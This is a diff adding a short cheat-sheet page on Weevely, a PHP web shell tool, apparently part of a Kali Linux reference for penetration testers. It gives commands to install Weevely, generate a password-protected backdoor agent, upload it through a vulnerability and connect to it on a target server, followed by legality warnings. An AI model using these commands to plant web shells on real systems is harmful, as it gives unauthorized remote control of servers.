@@ -1,0 +1,51 @@
+Weevely
+Weaponized web shell for PHP
+
+Post Exploitation
+Description
+Weevely is a web shell that simulates a telnet-like connection. It is designed for post-exploitation and stealth persistence.
+
+Installation / Check
+Check if installed:
+
+which weevely
+Install command:
+
+sudo apt install weevely
+Basic Syntax
+weevely generate <password> <path>
+Common Commands
+Command	What it does	When to use	Risk
+weevely generate mypassword agent.php
+
+Generate shell	Create backdoor	
+weevely http://target.com/agent.php mypassword
+
+Connect to shell	Access uploaded shell	
+:system_info
+
+Get system info	Enumerate target	
+Step-by-Step Guide
+1
+Generate agent: weevely generate
+2
+Upload to target via vulnerability
+3
+Connect: weevely URL password
+4
+Run commands or modules
+5
+Clean up after testing
+Understanding the Output
+Terminal-like interface. Commands executed on target server.
+
+Important Warnings
+•
+Creating backdoors is illegal
+•
+Leaves evidence on server
+•
+Use only in authorized tests
+•
+Clean up after engagement
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
